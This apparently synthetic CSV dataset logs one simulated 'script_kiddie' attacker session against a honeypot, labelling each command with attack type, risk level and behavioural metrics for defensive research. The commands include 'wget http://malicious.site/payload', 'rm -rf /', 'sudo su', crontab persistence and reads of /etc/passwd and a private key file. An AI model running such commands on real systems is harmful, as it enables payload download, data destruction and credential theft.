session_id,attacker_id,attacker_profile,timestamp,attacker_input,honeypot_response,attack_type,risk_level,response_success,current_privileges,failed_attempts,session_position,attack_phase,engagement_time,hawkes_intensity,frustration_level,temporal_phase,deception_triggered,data_collected,privilege_escalation_attempt,high_risk_activity,system_state_hash,time_since_session_start,commands_per_minute
2,1,script_kiddie,2025-05-24 23:38:11.081344,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,21,initial_recon,4.68730061476485,0.1210533355651896,0.5000000000000002,initial_recon,1,1,0,0,-8958916735605131775,66.56325908649418,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:15.768645,whoami,user,reconnaissance,1,False,True,1,22,initial_recon,0.1,0.1128555658456805,0.4000000000000002,initial_recon,1,0,0,0,-8958916735605131775,66.6632590864942,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:15.868645,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,0,23,initial_recon,1.4208268688709382,0.1078025622379501,0.6000000000000003,initial_recon,1,1,0,1,-8958916735605131775,68.08408595536513,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:17.289472,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,24,initial_recon,1.2885082236430616,0.1047386771342954,0.5000000000000003,initial_recon,1,0,0,0,-8958916735605131775,69.37259417900819,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:18.577980,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,25,initial_recon,0.3777204139413427,0.1028776635856398,0.4000000000000003,initial_recon,1,1,0,1,-8958916735605131775,69.75031459294954,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:18.955701,crontab -e,Command executed,persistence,3,False,True,1,26,initial_recon,0.408388079538462,0.1017467415891342,0.3000000000000004,initial_recon,1,0,0,0,-8958916735605131775,70.15870267248799,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:19.364089,whoami,user,reconnaissance,1,False,True,2,27,initial_recon,0.9018678407307472,0.1010602840411081,0.5000000000000004,initial_recon,1,0,0,0,-8958916735605131775,71.06057051321874,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:20.265957,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,1,28,initial_recon,2.959523534744482,0.1006437404091741,0.7000000000000004,initial_recon,1,0,0,0,-8958916735605131775,74.02009404796323,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:23.225480,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,29,initial_recon,0.9200399051259014,0.1003915438921706,0.6000000000000004,initial_recon,1,1,0,0,-8958916735605131775,74.94013395308912,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:24.145520,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,30,initial_recon,0.6498807012650802,0.1002377230572103,0.5000000000000004,initial_recon,1,0,0,0,-8958916735605131775,75.5900146543542,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:24.795401,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,31,initial_recon,0.1994802087080181,0.1001443133285985,0.4000000000000004,initial_recon,1,1,0,0,-8958916735605131775,75.78949486306222,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:24.994881,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,32,initial_recon,0.9388462433157152,0.1000875919581519,0.3000000000000005,initial_recon,1,1,0,0,-8958916735605131775,76.72834110637794,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:25.933727,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,33,initial_recon,0.1732580984868211,0.1000531811936991,0.2000000000000004,initial_recon,1,0,0,0,-8958916735605131775,76.90159920486475,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:26.106985,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,34,initial_recon,0.5052431628534494,0.100032278354298,0.1000000000000004,initial_recon,1,0,0,0,-8958916735605131775,77.40684236771821,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:26.612228,sudo su,Permission denied,privilege_escalation,5,False,True,2,35,initial_recon,0.7934116865242075,0.1000195938007447,0.3000000000000005,initial_recon,1,0,1,1,-8958916735605131775,78.20025405424241,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:27.405640,sudo su,Command executed,privilege_escalation,5,True,True,1,36,initial_recon,5.54813212351128,0.1000118954418451,0.7000000000000004,initial_recon,1,0,1,1,-8958916735605131775,83.7483861777537,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:32.953772,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,37,initial_recon,1.255635154605143,0.1000072881621717,0.6000000000000004,initial_recon,1,1,0,1,-8958916735605131775,85.00402133235883,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:34.209407,rm -rf /,Command executed,destruction,5,False,True,1,38,initial_recon,0.7336283122627357,0.1000044256857667,0.5000000000000004,initial_recon,1,0,0,1,-8958916735605131775,85.73764964462157,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:34.943036,sudo su,Command executed,privilege_escalation,5,False,True,2,39,initial_recon,0.2755344789572466,0.1000026867397763,0.7000000000000004,initial_recon,1,0,1,1,-8958916735605131775,86.01318412357882,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:35.218570,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,1,40,initial_recon,0.4667750395644279,0.100001630760115,0.9000000000000004,initial_recon,1,0,0,0,-8958916735605131775,86.47995916314325,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:35.685345,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,41,initial_recon,0.8914289322226241,0.1000009898868997,0.8000000000000004,initial_recon,1,1,0,0,-8958916735605131775,87.37138809536587,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:36.576774,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,42,initial_recon,2.257395506771365,0.1000006009824279,0.7000000000000004,initial_recon,1,1,0,0,-8958916735605131775,89.62878360213723,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:38.834170,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,0,43,initial_recon,0.4978692904974143,0.1000003652175422,0.6000000000000004,initial_recon,1,1,0,1,-8958916735605131775,90.12665289263464,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:39.332039,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,44,initial_recon,0.508326953376905,0.1000002216926072,0.5000000000000004,initial_recon,1,0,0,0,-8958916735605131775,90.63497984601156,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:39.840366,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,45,initial_recon,0.1,0.100000134571264,0.4000000000000004,initial_recon,1,1,0,0,-8958916735605131775,90.73497984601156,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:39.940366,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,46,initial_recon,0.1,0.1000000816749569,0.3000000000000005,initial_recon,1,0,0,0,-8958916735605131775,90.83497984601156,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:40.040366,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,47,initial_recon,0.1811925360227849,0.1000000495707295,0.2000000000000004,initial_recon,1,1,0,0,-8958916735605131775,91.01617238203434,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:40.221558,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,48,initial_recon,0.586228893382621,0.1000000300866103,0.1000000000000004,initial_recon,1,1,0,1,-8958916735605131775,91.60240127541697,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:40.807787,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,49,initial_recon,0.1606494537230355,0.1000000182636344,4.718447854656915e-16,initial_recon,1,0,0,0,-8958916735605131775,91.76305072914,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:40.968437,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,50,initial_recon,0.1,0.1000000110848979,0.0,initial_recon,1,1,0,0,-8958916735605131775,91.86305072914,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:41.068437,crontab -e,Command executed,persistence,3,False,True,1,51,initial_recon,1.2683468585201625,0.1000000067277104,0.0,initial_recon,1,0,0,0,-8958916735605131775,93.13139758766016,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:42.336784,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,52,initial_recon,0.1,0.1000000040853272,0.2,initial_recon,1,0,0,0,-8958916735605131775,93.23139758766015,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:42.436784,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,53,initial_recon,0.68967863720765,0.1000000024794875,0.1,initial_recon,1,1,0,1,-8958916735605131775,93.9210762248678,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:43.126462,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,54,initial_recon,0.1,0.1000000015051977,0.0,initial_recon,1,0,0,0,-8958916735605131775,94.0210762248678,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:43.226462,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,55,initial_recon,0.2650650282889242,0.1000000009135413,0.0,initial_recon,1,1,0,0,-8958916735605131775,94.28614125315671,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:43.491527,whoami,user,reconnaissance,1,False,True,1,56,initial_recon,0.1,0.1000000005544813,0.0,initial_recon,1,0,0,0,-8958916735605131775,94.38614125315674,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:43.591527,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,57,initial_recon,0.5504915780084948,0.1000000003365279,0.2,initial_recon,1,1,0,0,-8958916735605131775,94.93663283116524,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:44.142019,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,58,initial_recon,0.1,0.1000000002042802,0.1,initial_recon,1,0,0,0,-8958916735605131775,95.03663283116524,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:44.242019,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,59,initial_recon,0.9023067028509476,0.1000000001239824,0.0,initial_recon,1,1,0,0,-8958916735605131775,95.93893953401616,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:45.144326,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,60,initial_recon,0.3797647514623901,0.1000000000752717,0.0,initial_recon,1,1,0,1,-8958916735605131775,96.31870428547856,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:45.524090,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,61,initial_recon,0.1,0.1000000000456887,0.0,initial_recon,1,0,0,0,-8958916735605131775,96.41870428547855,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:45.624090,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,62,initial_recon,0.1110771213350624,0.1000000000277294,0.0,initial_recon,1,1,0,0,-8958916735605131775,96.52978140681364,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:45.735167,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,63,initial_recon,0.1136795963717251,0.1000000000168296,0.0,initial_recon,1,0,0,0,-8958916735605131775,96.64346100318537,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:45.848847,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,64,initial_recon,0.1,0.1000000000102144,0.0,initial_recon,1,0,0,0,-8958916735605131775,96.74346100318536,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:45.948847,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,65,initial_recon,0.1586996921026314,0.1000000000061993,0.0,initial_recon,1,1,0,0,-8958916735605131775,96.902160695288,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:46.107547,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,66,initial_recon,0.2212079900026259,0.1000000000037627,0.0,initial_recon,1,0,0,0,-8958916735605131775,97.1233686852906,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:46.328755,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,67,initial_recon,0.4546531831675957,0.1000000000022837,0.0,initial_recon,1,1,0,0,-8958916735605131775,97.5780218684582,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:46.783408,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,68,initial_recon,0.6900364218584499,0.1000000000013861,0.0,initial_recon,1,0,0,0,-8958916735605131775,98.26805829031666,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:47.473444,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,69,initial_recon,0.1,0.1000000000008414,0.2,initial_recon,1,0,0,0,-8958916735605131775,98.36805829031664,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:47.573444,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,70,initial_recon,0.5472866595261594,0.1000000000005108,0.1,initial_recon,1,1,0,0,-8958916735605131775,98.91534494984282,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:48.120731,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,71,initial_recon,0.1,0.1000000000003099,0.0,initial_recon,1,1,0,0,-8958916735605131775,99.0153449498428,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:48.220731,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,72,initial_recon,0.1082675581141134,0.1000000000001882,0.0,initial_recon,1,0,0,0,-8958916735605131775,99.12361250795692,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:48.328999,whoami,user,reconnaissance,1,False,True,1,73,initial_recon,0.1,0.100000000000114,0.0,initial_recon,1,0,0,0,-8958916735605131775,99.22361250795691,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:48.428999,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,74,initial_recon,1.7224783088691171,0.1000000000000692,0.2,initial_recon,1,1,0,0,-8958916735605131775,100.94609081682604,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:50.151477,whoami,user,reconnaissance,1,False,True,1,75,initial_recon,0.1,0.1000000000000421,0.1,initial_recon,1,0,0,0,-8958916735605131775,101.04609081682604,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:50.251477,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,76,initial_recon,0.1,0.1000000000000254,0.3,initial_recon,1,0,0,0,-8958916735605131775,101.14609081682605,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:50.351477,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,77,initial_recon,0.1,0.1000000000000156,0.2,initial_recon,1,1,0,0,-8958916735605131775,101.24609081682604,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:50.451477,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,78,initial_recon,0.1,0.1000000000000093,0.1,initial_recon,1,0,0,0,-8958916735605131775,101.34609081682603,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:50.551477,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,79,initial_recon,0.908300579742416,0.1000000000000054,2.775557561562892e-17,initial_recon,1,1,0,0,-8958916735605131775,102.25439139656848,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:51.459777,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,80,initial_recon,0.1,0.1000000000000033,0.0,initial_recon,1,0,0,0,-8958916735605131775,102.35439139656846,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:51.559777,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,81,initial_recon,1.6154568664064002,0.1000000000000019,0.0,initial_recon,1,1,0,0,-8958916735605131775,103.96984826297486,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:53.175234,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,82,initial_recon,0.1,0.1000000000000012,0.0,initial_recon,1,0,0,0,-8958916735605131775,104.06984826297486,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:53.275234,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,83,initial_recon,1.0031220309840847,0.1000000000000007,0.0,initial_recon,1,1,0,1,-8958916735605131775,105.07297029395896,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:54.278356,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,84,initial_recon,0.2982750835335059,0.1000000000000004,0.0,initial_recon,1,0,0,0,-8958916735605131775,105.37124537749246,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:54.576631,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,85,initial_recon,0.1767295357890858,0.1000000000000002,0.2,initial_recon,1,0,0,0,-8958916735605131775,105.54797491328154,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:54.753361,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,86,initial_recon,0.4068252109523718,0.1000000000000001,0.1,initial_recon,1,1,0,1,-8958916735605131775,105.95480012423393,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:55.160186,whoami,user,reconnaissance,1,False,True,1,87,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,106.0548001242339,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:55.260186,find / -name '*.key',Command not found,data_exfiltration,3,False,True,2,88,initial_recon,0.2070779821460709,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,106.26187810637998,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:55.467264,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,1,89,initial_recon,0.1329946920167593,0.1,0.4,initial_recon,1,0,0,0,-8958916735605131775,106.39487279839676,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:55.600259,whoami,user,reconnaissance,1,False,True,2,90,initial_recon,0.1,0.1,0.3,initial_recon,1,0,0,0,-8958916735605131775,106.49487279839674,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:55.700259,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,1,91,initial_recon,0.150911945188697,0.1,0.5,initial_recon,1,0,0,0,-8958916735605131775,106.64578474358544,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:55.851171,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,92,initial_recon,0.3481812273169775,0.1,0.4,initial_recon,1,1,0,0,-8958916735605131775,106.99396597090242,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:56.199352,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,93,initial_recon,0.1049794204845644,0.1,0.3,initial_recon,1,0,0,0,-8958916735605131775,107.09894539138698,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:56.304331,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,94,initial_recon,0.1,0.1,0.2,initial_recon,1,1,0,0,-8958916735605131775,107.198945391387,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:56.404331,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,95,initial_recon,0.1,0.1,0.1,initial_recon,1,0,0,0,-8958916735605131775,107.29894539138698,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:56.504331,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,96,initial_recon,0.4601201311395324,0.1,2.775557561562892e-17,initial_recon,1,0,0,0,-8958916735605131775,107.75906552252653,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:56.964452,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,97,initial_recon,0.6640282455079595,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,108.42309376803448,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:57.628480,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,98,initial_recon,0.2745939242448844,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,108.69768769227936,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:57.903074,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,99,initial_recon,0.9054465941691398,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,109.6031342864485,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:58.808520,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,100,initial_recon,0.2123031254021511,0.1,0.2,initial_recon,1,1,0,0,-8958916735605131775,109.81543741185064,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:59.020823,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,101,initial_recon,0.6366134515729874,0.1,0.1,initial_recon,1,0,0,0,-8958916735605131775,110.45205086342364,81.04746336600701
2,1,script_kiddie,2025-05-24 23:38:59.657437,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,102,initial_recon,3.353176389415692,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,113.80522725283932,81.04746336600701
2,1,script_kiddie,2025-05-24 23:39:03.010613,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,103,initial_recon,0.2100082181536812,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,114.015235470993,81.04746336600701
